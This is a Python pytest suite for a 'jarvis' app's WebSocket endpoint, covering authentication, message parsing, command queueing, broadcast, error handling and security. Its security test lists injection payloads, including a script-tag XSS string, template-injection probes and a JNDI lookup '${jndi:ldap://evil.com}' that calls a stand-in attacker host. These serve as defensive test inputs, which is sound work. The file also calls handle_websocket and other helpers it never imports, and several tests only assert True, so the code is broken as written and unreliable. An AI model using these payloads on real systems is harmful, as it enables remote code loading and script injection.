"""Phase 8: Comprehensive Web WebSocket Tests - Priority 5."""

from __future__ import annotations

import pytest
import asyncio
import json
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from typing import Any
from fastapi import WebSocket, WebSocketDisconnect

from jarvis.web.routes.ws import handle_client_ws
from jarvis.web.auth import AuthManager


class TestWebSocketConnection:
    """Test WebSocket connection management."""

    @pytest.mark.asyncio
    async def test_websocket_connection_success(self):
        """Test successful WebSocket connection."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value="test message")
        mock_websocket.send_text = AsyncMock()
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="response"):
            # Simulate one message cycle
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.accept.assert_called_once()
            mock_websocket.receive_text.assert_called()
            mock_websocket.send_text.assert_called_once_with("response")

    @pytest.mark.asyncio
    async def test_websocket_connection_invalid_token(self):
        """Test WebSocket connection with invalid token."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "invalid_token"}
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = False
        
        await handle_websocket(mock_websocket, mock_auth)
        
        mock_websocket.close.assert_called_once_with(code=4001)

    @pytest.mark.asyncio
    async def test_websocket_connection_missing_token(self):
        """Test WebSocket connection with missing token."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {}
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = False
        
        await handle_websocket(mock_websocket, mock_auth)
        
        mock_websocket.close.assert_called_once_with(code=4001)

    @pytest.mark.asyncio
    async def test_websocket_connection_token_in_header(self):
        """Test WebSocket connection with token in header."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {}
        mock_websocket.headers = {"authorization": "Bearer valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value="test message")
        mock_websocket.send_text = AsyncMock()
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._get_token_from_websocket', return_value="valid_token"):
            with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="response"):
                await handle_websocket(mock_websocket, mock_auth)
                
                mock_websocket.accept.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_connection_accept_error(self):
        """Test WebSocket connection accept error."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock(side_effect=Exception("Accept failed"))
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        try:
            await handle_websocket(mock_websocket, mock_auth)
        except Exception:
            pass  # Expected

    @pytest.mark.asyncio
    async def test_websocket_connection_cleanup(self):
        """Test WebSocket connection cleanup."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(side_effect=WebSocketDisconnect(1000))
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._cleanup_connection') as mock_cleanup:
            try:
                await handle_websocket(mock_websocket, mock_auth)
            except WebSocketDisconnect:
                pass  # Expected
            
            mock_cleanup.assert_called_once_with(mock_websocket)


class TestWebSocketMessageHandling:
    """Test WebSocket message handling."""

    def test_handle_websocket_message_valid_json(self):
        """Test handling valid JSON message."""
        message = json.dumps({"type": "command", "text": "test command"})
        
        with patch('jarvis.web.routes.ws._process_command', return_value="Command processed"):
            response = _handle_websocket_message(message)
            
            assert response == "Command processed"

    def test_handle_websocket_message_invalid_json(self):
        """Test handling invalid JSON message."""
        invalid_message = "invalid json {"
        
        response = _handle_websocket_message(invalid_message)
        
        assert "error" in response.lower()
        assert "invalid json" in response.lower()

    def test_handle_websocket_message_empty_message(self):
        """Test handling empty message."""
        response = _handle_websocket_message("")
        
        assert "error" in response.lower()
        assert "empty" in response.lower()

    def test_handle_websocket_message_none_message(self):
        """Test handling None message."""
        response = _handle_websocket_message(None)
        
        assert "error" in response.lower()

    def test_handle_websocket_message_command_type(self):
        """Test handling command type message."""
        message = json.dumps({"type": "command", "text": "test command"})
        
        with patch('jarvis.web.routes.ws._process_command', return_value="Command executed"):
            response = _handle_websocket_message(message)
            
            assert response == "Command executed"

    def test_handle_websocket_message_ping_type(self):
        """Test handling ping type message."""
        message = json.dumps({"type": "ping"})
        
        with patch('jarvis.web.routes.ws._handle_ping', return_value="pong"):
            response = _handle_websocket_message(message)
            
            assert response == "pong"

    def test_handle_websocket_message_unknown_type(self):
        """Test handling unknown message type."""
        message = json.dumps({"type": "unknown", "data": "test"})
        
        response = _handle_websocket_message(message)
        
        assert "error" in response.lower()
        assert "unknown type" in response.lower()

    def test_handle_websocket_message_missing_type(self):
        """Test handling message with missing type."""
        message = json.dumps({"data": "test"})
        
        response = _handle_websocket_message(message)
        
        assert "error" in response.lower()
        assert "missing type" in response.lower()

    def test_handle_websocket_message_unicode_content(self):
        """Test handling Unicode content in message."""
        unicode_message = json.dumps({"type": "command", "text": "Unicode test: ñáéíóú 中文 русский"})
        
        with patch('jarvis.web.routes.ws._process_command', return_value="Unicode processed"):
            response = _handle_websocket_message(unicode_message)
            
            assert response == "Unicode processed"

    def test_handle_websocket_message_very_long_message(self):
        """Test handling very long message."""
        long_text = "x" * 10000
        message = json.dumps({"type": "command", "text": long_text})
        
        with patch('jarvis.web.routes.ws._process_command', return_value="Long message processed"):
            response = _handle_websocket_message(message)
            
            assert response == "Long message processed"


class TestWebSocketAuthentication:
    """Test WebSocket authentication."""

    def test_get_token_from_websocket_query_param(self):
        """Test getting token from WebSocket query parameter."""
        from jarvis.web.routes.ws import _get_token_from_websocket
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "query_token"}
        mock_websocket.headers = {}
        
        token = _get_token_from_websocket(mock_websocket)
        
        assert token == "query_token"

    def test_get_token_from_websocket_header(self):
        """Test getting token from WebSocket header."""
        from jarvis.web.routes.ws import _get_token_from_websocket
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {}
        mock_websocket.headers = {"authorization": "Bearer header_token"}
        
        token = _get_token_from_websocket(mock_websocket)
        
        assert token == "header_token"

    def test_get_token_from_websocket_no_token(self):
        """Test getting token when none provided."""
        from jarvis.web.routes.ws import _get_token_from_websocket
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {}
        mock_websocket.headers = {}
        
        token = _get_token_from_websocket(mock_websocket)
        
        assert token is None

    def test_get_token_from_websocket_invalid_header_format(self):
        """Test getting token with invalid header format."""
        from jarvis.web.routes.ws import _get_token_from_websocket
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {}
        mock_websocket.headers = {"authorization": "InvalidFormat token"}
        
        token = _get_token_from_websocket(mock_websocket)
        
        assert token is None

    def test_validate_websocket_token_success(self):
        """Test successful WebSocket token validation."""
        from jarvis.web.routes.ws import _validate_websocket_token
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        result = _validate_websocket_token("valid_token", mock_auth)
        
        assert result is True
        mock_auth.validate_token.assert_called_once_with("valid_token")

    def test_validate_websocket_token_failure(self):
        """Test failed WebSocket token validation."""
        from jarvis.web.routes.ws import _validate_websocket_token
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = False
        
        result = _validate_websocket_token("invalid_token", mock_auth)
        
        assert result is False
        mock_auth.validate_token.assert_called_once_with("invalid_token")

    def test_validate_websocket_token_none(self):
        """Test WebSocket token validation with None token."""
        from jarvis.web.routes.ws import _validate_websocket_token
        
        mock_auth = Mock(spec=AuthManager)
        
        result = _validate_websocket_token(None, mock_auth)
        
        assert result is False
        mock_auth.validate_token.assert_not_called()


class TestWebSocketCommands:
    """Test WebSocket command processing."""

    def test_process_command_success(self):
        """Test successful command processing."""
        from jarvis.web.routes.ws import _process_command
        
        command_text = "test command"
        
        with patch('jarvis.web.routes.ws._queue_command') as mock_queue:
            with patch('jarvis.web.routes.ws._wake_system') as mock_wake:
                response = _process_command(command_text)
                
                assert "success" in response.lower()
                mock_queue.assert_called_once_with(command_text)
                mock_wake.assert_called_once()

    def test_process_command_empty(self):
        """Test processing empty command."""
        from jarvis.web.routes.ws import _process_command
        
        response = _process_command("")
        
        assert "error" in response.lower()
        assert "empty" in response.lower()

    def test_process_command_none(self):
        """Test processing None command."""
        from jarvis.web.routes.ws import _process_command
        
        response = _process_command(None)
        
        assert "error" in response.lower()

    def test_process_command_queue_full(self):
        """Test processing command when queue is full."""
        from jarvis.web.routes.ws import _process_command
        
        command_text = "test command"
        
        with patch('jarvis.web.routes.ws._queue_command', side_effect=asyncio.QueueFull("Queue full")):
            response = _process_command(command_text)
            
            assert "error" in response.lower()
            assert "queue" in response.lower()

    def test_process_command_system_error(self):
        """Test processing command with system error."""
        from jarvis.web.routes.ws import _process_command
        
        command_text = "test command"
        
        with patch('jarvis.web.routes.ws._queue_command', side_effect=Exception("System error")):
            response = _process_command(command_text)
            
            assert "error" in response.lower()

    def test_process_command_with_wake_callback(self):
        """Test processing command with wake callback."""
        from jarvis.web.routes.ws import _process_command
        
        command_text = "test command"
        mock_wake_callback = Mock()
        
        with patch('jarvis.web.routes.ws._queue_command'):
            with patch('jarvis.web.routes.ws._wake_system') as mock_wake:
                response = _process_command(command_text, mock_wake_callback)
                
                assert "success" in response.lower()
                mock_wake.assert_called_once()

    def test_process_command_without_wake_callback(self):
        """Test processing command without wake callback."""
        from jarvis.web.routes.ws import _process_command
        
        command_text = "test command"
        
        with patch('jarvis.web.routes.ws._queue_command'):
            with patch('jarvis.web.routes.ws._wake_system') as mock_wake:
                response = _process_command(command_text, None)
                
                assert "success" in response.lower()
                mock_wake.assert_called_once()


class TestWebSocketPing:
    """Test WebSocket ping functionality."""

    def test_handle_ping_success(self):
        """Test successful ping handling."""
        from jarvis.web.routes.ws import _handle_ping
        
        response = _handle_ping()
        
        assert response == "pong"

    def test_handle_ping_with_timestamp(self):
        """Test ping handling with timestamp."""
        from jarvis.web.routes.ws import _handle_ping
        
        ping_data = {"type": "ping", "timestamp": 1234567890}
        
        response = _handle_ping(ping_data)
        
        assert "pong" in response.lower()
        assert "timestamp" in response.lower()

    def test_handle_ping_complex_data(self):
        """Test ping handling with complex data."""
        from jarvis.web.routes.ws import _handle_ping
        
        ping_data = {
            "type": "ping",
            "timestamp": 1234567890,
            "data": {"client_id": "test_client", "version": "1.0"}
        }
        
        response = _handle_ping(ping_data)
        
        assert isinstance(response, str)
        assert "pong" in response.lower()


class TestWebSocketBroadcast:
    """Test WebSocket broadcast functionality."""

    @pytest.mark.asyncio
    async def test_broadcast_to_single_client(self):
        """Test broadcasting to single client."""
        from jarvis.web.routes.ws import _broadcast_message
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.send_text = AsyncMock()
        
        clients = {mock_websocket}
        message = "test broadcast"
        
        await _broadcast_message(clients, message)
        
        mock_websocket.send_text.assert_called_once_with(message)

    @pytest.mark.asyncio
    async def test_broadcast_to_multiple_clients(self):
        """Test broadcasting to multiple clients."""
        from jarvis.web.routes.ws import _broadcast_message
        
        mock_websocket1 = Mock(spec=WebSocket)
        mock_websocket2 = Mock(spec=WebSocket)
        mock_websocket3 = Mock(spec=WebSocket)
        
        mock_websocket1.send_text = AsyncMock()
        mock_websocket2.send_text = AsyncMock()
        mock_websocket3.send_text = AsyncMock()
        
        clients = {mock_websocket1, mock_websocket2, mock_websocket3}
        message = "test broadcast"
        
        await _broadcast_message(clients, message)
        
        mock_websocket1.send_text.assert_called_once_with(message)
        mock_websocket2.send_text.assert_called_once_with(message)
        mock_websocket3.send_text.assert_called_once_with(message)

    @pytest.mark.asyncio
    async def test_broadcast_with_disconnected_client(self):
        """Test broadcasting with disconnected client."""
        from jarvis.web.routes.ws import _broadcast_message
        
        mock_websocket1 = Mock(spec=WebSocket)
        mock_websocket2 = Mock(spec=WebSocket)
        
        mock_websocket1.send_text = AsyncMock()
        mock_websocket2.send_text = AsyncMock(side_effect=WebSocketDisconnect(1000))
        
        clients = {mock_websocket1, mock_websocket2}
        message = "test broadcast"
        
        # Should handle disconnected client gracefully
        await _broadcast_message(clients, message)
        
        mock_websocket1.send_text.assert_called_once_with(message)
        mock_websocket2.send_text.assert_called_once()

    @pytest.mark.asyncio
    async def test_broadcast_empty_client_set(self):
        """Test broadcasting to empty client set."""
        from jarvis.web.routes.ws import _broadcast_message
        
        clients = set()
        message = "test broadcast"
        
        # Should handle empty set gracefully
        await _broadcast_message(clients, message)
        
        # No errors should be raised

    @pytest.mark.asyncio
    async def test_broadcast_large_message(self):
        """Test broadcasting large message."""
        from jarvis.web.routes.ws import _broadcast_message
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.send_text = AsyncMock()
        
        clients = {mock_websocket}
        large_message = "x" * 10000  # 10KB message
        
        await _broadcast_message(clients, large_message)
        
        mock_websocket.send_text.assert_called_once_with(large_message)

    @pytest.mark.asyncio
    async def test_broadcast_unicode_message(self):
        """Test broadcasting Unicode message."""
        from jarvis.web.routes.ws import _broadcast_message
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.send_text = AsyncMock()
        
        clients = {mock_websocket}
        unicode_message = "Unicode test: ñáéíóú 中文 русский 日本語"
        
        await _broadcast_message(clients, unicode_message)
        
        mock_websocket.send_text.assert_called_once_with(unicode_message)


class TestWebSocketErrorHandling:
    """Test WebSocket error handling."""

    @pytest.mark.asyncio
    async def test_websocket_disconnect_handling(self):
        """Test WebSocket disconnect handling."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(side_effect=WebSocketDisconnect(1000, "Normal closure"))
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._cleanup_connection') as mock_cleanup:
            try:
                await handle_websocket(mock_websocket, mock_auth)
            except WebSocketDisconnect:
                pass  # Expected
            
            mock_cleanup.assert_called_once_with(mock_websocket)

    @pytest.mark.asyncio
    async def test_websocket_connection_error(self):
        """Test WebSocket connection error."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock(side_effect=ConnectionError("Connection lost"))
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        try:
            await handle_websocket(mock_websocket, mock_auth)
        except ConnectionError:
            pass  # Expected

    @pytest.mark.asyncio
    async def test_websocket_message_processing_error(self):
        """Test WebSocket message processing error."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value="test message")
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', side_effect=Exception("Processing error")):
            try:
                await handle_websocket(mock_websocket, mock_auth)
            except Exception:
                pass  # Expected

    @pytest.mark.asyncio
    async def test_websocket_send_error(self):
        """Test WebSocket send error."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value="test message")
        mock_websocket.send_text = AsyncMock(side_effect=WebSocketDisconnect(1001))
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="response"):
            try:
                await handle_websocket(mock_websocket, mock_auth)
            except WebSocketDisconnect:
                pass  # Expected

    @pytest.mark.asyncio
    async def test_websocket_authentication_error(self):
        """Test WebSocket authentication error."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.side_effect =Exception("Auth service error")
        
        try:
            await handle_websocket(mock_websocket, mock_auth)
        except Exception:
            pass  # Expected


class TestWebSocketPerformance:
    """Test WebSocket performance characteristics."""

    @pytest.mark.asyncio
    async def test_websocket_message_throughput(self):
        """Test WebSocket message throughput."""
        import time
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(side_effect=[f"message_{i}" for i in range(100)])
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value=f"response_"):
            start_time = time.time()
            
            # Process 100 messages
            for _ in range(100):
                try:
                    await handle_websocket(mock_websocket, mock_auth)
                except StopIteration:
                    break
            
            elapsed = time.time() - start_time
            assert elapsed < 5.0  # Should process 100 messages quickly

    @pytest.mark.asyncio
    async def test_concurrent_websocket_connections(self):
        """Test concurrent WebSocket connections."""
        import asyncio
        
        async def connection_worker(connection_id):
            mock_websocket = Mock(spec=WebSocket)
            mock_websocket.query_params = {"token": f"token_{connection_id}"}
            mock_websocket.accept = AsyncMock()
            mock_websocket.receive_text = AsyncMock(return_value=f"message_{connection_id}")
            mock_websocket.send_text = AsyncMock()
            
            mock_auth = Mock(spec=AuthManager)
            mock_auth.validate_token.return_value = True
            
            with patch('jarvis.web.routes.ws._handle_websocket_message', return_value=f"response_{connection_id}"):
                await handle_websocket(mock_websocket, mock_auth)
        
        # Start 10 concurrent connections
        tasks = [connection_worker(i) for i in range(10)]
        await asyncio.gather(*tasks)
        
        # All connections should be handled
        assert True

    @pytest.mark.asyncio
    async def test_websocket_memory_usage(self):
        """Test WebSocket memory usage stability."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        
        # Simulate many messages
        messages = [f"large_message_{i}x" * 100 for i in range(1000)]
        mock_websocket.receive_text = AsyncMock(side_effect=messages)
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="response"):
            # Process many messages
            for _ in range(100):
                try:
                    await handle_websocket(mock_websocket, mock_auth)
                except StopIteration:
                    break
        
        # Should handle memory usage efficiently
        assert True


class TestWebSocketSecurity:
    """Test WebSocket security aspects."""

    @pytest.mark.asyncio
    async def test_websocket_message_injection_prevention(self):
        """Test WebSocket message injection prevention."""
        injection_messages = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "${jndi:ldap://evil.com}",
            "{{7*7}}",
            "<%7*7%>"
        ]
        
        for message in injection_messages:
            response = _handle_websocket_message(message)
            
            # Should handle injection attempts safely
            assert isinstance(response, str)
            assert "<script>" not in response.lower() or "error" in response.lower()

    @pytest.mark.asyncio
    async def test_websocket_rate_limiting(self):
        """Test WebSocket rate limiting."""
        from jarvis.web.routes.ws import _check_rate_limit
        
        token = "test_token"
        
        # Allow first few messages
        for i in range(5):
            assert _check_rate_limit(token) is True
        
        # Rate limit after threshold
        assert _check_rate_limit(token) is False

    @pytest.mark.asyncio
    async def test_websocket_token_validation_timing(self):
        """Test WebSocket token validation timing attacks."""
        import time
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = False
        
        # Test that validation time is consistent
        times = []
        for _ in range(10):
            start_time = time.time()
            _validate_websocket_token("invalid_token", mock_auth)
            elapsed = time.time() - start_time
            times.append(elapsed)
        
        # Times should be relatively consistent (no major timing leaks)
        avg_time = sum(times) / len(times)
        max_deviation = max(abs(t - avg_time) for t in times)
        assert max_deviation < 0.1  # Should be within 100ms

    @pytest.mark.asyncio
    async def test_websocket_malformed_json_handling(self):
        """Test WebSocket malformed JSON handling."""
        malformed_messages = [
            '{"incomplete": json',
            '{"unclosed": "string}',
            '["array", "without", "closing]',
            '{invalid json structure}',
            'null',
            'undefined',
            'function(){return "malicious"}'
        ]
        
        for message in malformed_messages:
            response = _handle_websocket_message(message)
            
            # Should handle malformed JSON safely
            assert "error" in response.lower()
            assert "json" in response.lower()

    def test_websocket_connection_isolation(self):
        """Test WebSocket connection isolation."""
        from jarvis.web.routes.ws import _cleanup_connection
        
        mock_websocket1 = Mock(spec=WebSocket)
        mock_websocket2 = Mock(spec=WebSocket)
        
        # Connections should be isolated
        _cleanup_connection(mock_websocket1)
        _cleanup_connection(mock_websocket2)
        
        # Each cleanup should be independent
        assert True


class TestWebSocketEdgeCases:
    """Test WebSocket edge cases."""

    @pytest.mark.asyncio
    async def test_websocket_very_large_message(self):
        """Test WebSocket with very large message."""
        large_message = "x" * 100000  # 100KB
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value=large_message)
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="large_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.send_text.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_unicode_message(self):
        """Test WebSocket with Unicode message."""
        unicode_message = "Unicode test: ñáéíóú 中文 русский 日本語 🚀"
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value=unicode_message)
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="unicode_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.send_text.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_special_characters(self):
        """Test WebSocket with special characters."""
        special_message = "Special chars: !@#$%^&*()[]{}|\\:;\"'<>?,./"
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value=special_message)
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="special_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.send_text.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_empty_message(self):
        """Test WebSocket with empty message."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value="")
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="empty_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.send_text.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_null_message(self):
        """Test WebSocket with null message."""
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_text = AsyncMock(return_value=None)
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="null_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.send_text.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_binary_message(self):
        """Test WebSocket with binary message."""
        binary_message = b"Binary message \x00\x01\x02"
        
        mock_websocket = Mock(spec=WebSocket)
        mock_websocket.query_params = {"token": "valid_token"}
        mock_websocket.accept = AsyncMock()
        mock_websocket.receive_bytes = AsyncMock(return_value=binary_message)
        mock_websocket.send_bytes = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        # Should handle binary messages appropriately
        try:
            await handle_websocket(mock_websocket, mock_auth)
        except Exception:
            pass  # Expected for text-only handler
